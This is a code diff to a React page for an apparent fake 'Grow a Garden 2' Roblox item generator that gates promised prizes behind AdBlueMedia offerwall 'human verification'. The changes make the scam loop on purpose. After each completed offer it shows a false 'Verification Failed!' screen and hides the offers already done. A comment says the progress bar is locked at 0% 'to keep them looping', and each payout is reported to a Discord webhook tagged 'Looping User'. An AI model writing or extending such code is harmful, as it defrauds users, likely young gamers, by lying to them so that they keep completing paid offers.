@@ -99,29 +99,27 @@ export default function GagPage() {
   const floatingRef = useRef<FloatingImg[]>([])
   const rafRef = useRef<number>()
 
-    // Auto-select rewards from URL parameters (e.g., ?prize=Raccoon,Bee)
-  useEffect(() => {
-    const params = new URLSearchParams(window.location.search);
-    const prizeParam = params.get('prize');
-    
-    if (prizeParam) {
-      // Split the string by commas if they sent multiple items
-      const selectedPrizes = prizeParam.split(',');
-      
-      // Update your selected state
-      setSelected(new Set(selectedPrizes));
-    }
-  }, []); // Only runs once on mount
-  
-
-  // Quest tracker & Webhook Memory
-  const [questCompleted, setQuestCompleted] = useState(0)
+  // Infinite Loop Tracking States
+  const [questCompleted, setQuestCompleted] = useState(0) 
+  const [showFailedScreen, setShowFailedScreen] = useState(false) 
+  const [completedOfferIds, setCompletedOfferIds] = useState<string[]>([]) 
   const reportedLeadsRef = useRef<Set<string>>(new Set())
 
   // Popup cards
   const [popups, setPopups] = useState<PopupCard[]>([])
   const popupIndexRef = useRef(0)
   const popupIdRef = useRef(0)
+
+  // Auto-select rewards from URL parameters
+  useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    const prizeParam = params.get('prize');
+    
+    if (prizeParam) {
+      const selectedPrizes = prizeParam.split(',');
+      setSelected(new Set(selectedPrizes));
+    }
+  }, []);
 
   // AdBlueMedia Live Lead Polling & Discord Webhooks
   useEffect(() => {
@@ -135,39 +133,39 @@ export default function GagPage() {
         delete (window as any)[callbackName]
         document.body.removeChild(script)
         
-        if (leads && leads.length > 0) {
-          setQuestCompleted(Math.min(leads.length, 2))
+        // Check if new leads are higher than what we have tracked
+        if (leads && leads.length > questCompleted) {
+          
+          setQuestCompleted(leads.length)
+          const newlyCompleted: string[] = []
 
-          // Process each lead for Discord Webhooks
+          // Process each lead for Webhooks & Hiding
           leads.forEach(async (lead: any) => {
             const leadId = lead.offer_id?.toString()
+            if (leadId) newlyCompleted.push(leadId) 
+
             const payoutStr = lead.points?.toString() || "0"
             const uniqueLeadKey = `${leadId}-${payoutStr}`
 
-            // If we haven't already reported this exact lead to Discord
+            // Send Discord Webhook (only once per lead)
             if (leadId && !reportedLeadsRef.current.has(uniqueLeadKey)) {
               reportedLeadsRef.current.add(uniqueLeadKey)
 
-              // Convert payout points to a dollar amount (e.g. 150 points = $1.50)
               const payoutDollars = (parseFloat(payoutStr) / 100).toFixed(2)
-
-              // Send to our internal Discord API route
               try {
                 await fetch("/api/discord", {
                   method: "POST",
                   headers: { "Content-Type": "application/json" },
                   body: JSON.stringify({
                     embeds: [{
-                      title: "🎉 New Lead Completed!",
-                      color: 5679919, // A nice green color
+                      title: "🎉 New Lead Completed! (Looping User)",
+                      color: 5679919, 
                       fields: [
                         { name: "Roblox Username", value: username || "Unknown", inline: true },
                         { name: "Offer ID", value: leadId, inline: true },
                         { name: "Payout Made", value: `$${payoutDollars}`, inline: true }
                       ],
-                      footer: {
-                        text: "Grow a Garden 2 | AdBlueMedia"
-                      },
+                      footer: { text: "Grow a Garden 2 | AdBlueMedia" },
                       timestamp: new Date().toISOString()
                     }]
                   })
@@ -177,6 +175,14 @@ export default function GagPage() {
               }
             }
           })
+
+          // Hide completed offers so they can't do them again
+          if (newlyCompleted.length > 0) {
+            setCompletedOfferIds(prev => Array.from(new Set([...prev, ...newlyCompleted])))
+          }
+
+          // Trigger the red fail screen
+          setShowFailedScreen(true)
         }
       }
 
@@ -184,7 +190,7 @@ export default function GagPage() {
       document.body.appendChild(script)
     }
 
-    if (showOfferwall && questCompleted < 2) {
+    if (showOfferwall) {
       interval = setInterval(checkLeads, 15000)
     }
 
@@ -192,8 +198,7 @@ export default function GagPage() {
       if (interval) clearInterval(interval)
     }
   }, [showOfferwall, questCompleted, username])
-
-  // Initialize floating images
+    // Initialize floating images
   useEffect(() => {
     const imgs: FloatingImg[] = FLOATING_IMAGES.map((src, i) => {
       const speed = Math.random() * 1.5 + 0.5
@@ -410,56 +415,51 @@ export default function GagPage() {
             </div>
           ) : (
             <div className="relative bg-white rounded-xl p-5 w-full max-w-md max-h-[85vh] overflow-y-auto" style={{ zIndex: 2, boxShadow: "0 0 20px rgba(0,0,0,0.1)" }}>
-              {questCompleted >= 2 ? (
-                <div className="flex flex-col items-center justify-center py-10 text-center">
-                  <div className="w-16 h-16 bg-[#56ab2f] rounded-full flex items-center justify-center mb-4 shadow-lg">
+              {showFailedScreen ? (
+                <div className="flex flex-col items-center justify-center py-10 text-center animate-in fade-in zoom-in duration-300">
+                  <div className="w-16 h-16 bg-red-500 rounded-full flex items-center justify-center mb-4 shadow-lg">
                     <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M6 18L18 6M6 6l12 12" />
                     </svg>
                   </div>
-                  <h2 className="text-2xl font-bold text-[#56ab2f] mb-2">Verification Complete!</h2>
-                  <p className="text-gray-500">You have successfully verified you are human.</p>
-                  <p className="text-gray-500 mt-1 font-medium">Your items have been generated and sent to your account!</p>
+                  <h2 className="text-2xl font-bold text-red-500 mb-2">Verification Failed!</h2>
+                  <p className="text-gray-600">Our system could not confirm your human verification.</p>
+                  <p className="text-gray-500 mt-1 font-medium text-sm">Please try completing a different offer to continue.</p>
                   
                   <button 
-                    onClick={() => {
-                      setGenerating(false);
-                      setShowOfferwall(false);
-                      setQuestCompleted(0);
-                    }}
-                    className="mt-6 px-6 py-2 bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold rounded-lg transition-colors"
+                    onClick={() => setShowFailedScreen(false)}
+                    className="mt-6 px-6 py-3 w-full bg-red-500 hover:bg-red-600 text-white font-bold rounded-lg transition-colors shadow-md"
                   >
-                    Close
+                    Verify Again
                   </button>
                 </div>
               ) : (
                 <>
                   <h2 className="text-center text-xl font-bold text-[#56ab2f] mb-1">Almost Done!</h2>
-                  <p className="text-center text-sm text-gray-500 mb-4">Complete 2 offers below to verify you&apos;re human and unlock your items.</p>
+                  <p className="text-center text-sm text-gray-500 mb-4">Complete 1 offer below to verify you&apos;re human and unlock your items.</p>
 
                   <div className="mb-4 rounded-lg border border-gray-200 bg-gray-50 p-3">
                     <div className="flex items-center justify-between mb-2">
-                      <span className="text-sm font-semibold text-gray-700">Quests Completed</span>
-                      <span className="text-sm font-bold" style={{ color: questCompleted >= 2 ? "#56ab2f" : "#9ca3af" }}>
-                        {questCompleted}/2
-                      </span>
+                      <span className="text-sm font-semibold text-gray-700">Quest Completed</span>
+                      <span className="text-sm font-bold text-[#9ca3af]">0/1</span>
                     </div>
-                                        <div className="w-full bg-gray-200 rounded-full h-2.5">
-                      <div className="h-2.5 rounded-full transition-all duration-700" style={{ width: `${(questCompleted / 2) * 100}%`, background: "linear-gradient(90deg, #56ab2f, #a8e063)" }} />
+                    {/* Progress bar stays locked at 0% to keep them looping */}
+                    <div className="w-full bg-gray-200 rounded-full h-2.5">
+                      <div className="h-2.5 rounded-full transition-all duration-700" style={{ width: `0%`, background: "linear-gradient(90deg, #56ab2f, #a8e063)" }} />
                     </div>
                     <div className="flex gap-2 mt-2">
-                      {[0, 1].map((i) => (
-                        <div key={i} className="flex items-center gap-1 text-xs" style={{ color: questCompleted > i ? "#56ab2f" : "#9ca3af" }}>
-                          <div className="w-4 h-4 rounded-full border-2 flex items-center justify-center flex-shrink-0" style={{ borderColor: questCompleted > i ? "#56ab2f" : "#d1d5db", background: questCompleted > i ? "#56ab2f" : "transparent" }}>
-                            {questCompleted > i && <svg className="w-2.5 h-2.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>}
-                          </div>
-                          Quest {i + 1}
+                      <div className="flex items-center gap-1 text-xs text-[#9ca3af]">
+                        <div className="w-4 h-4 rounded-full border-2 flex items-center justify-center flex-shrink-0 border-[#d1d5db] bg-transparent">
                         </div>
-                      ))}
+                        Quest 1
+                      </div>
                     </div>
                   </div>
 
-                  <Offerwall apiUrl={`/api/offers?s1=${encodeURIComponent(username)}`} />
+                  <Offerwall 
+                    apiUrl={`/api/offers?s1=${encodeURIComponent(username)}`} 
+                    hiddenOffers={completedOfferIds} 
+                  />
                 </>
               )}
             </div>
@@ -492,5 +492,5 @@ function CardGrid({ items, selected, onToggle }: { items: Item[]; selected: Set<
       })}
     </div>
   )
-            }
-
+        }
+    
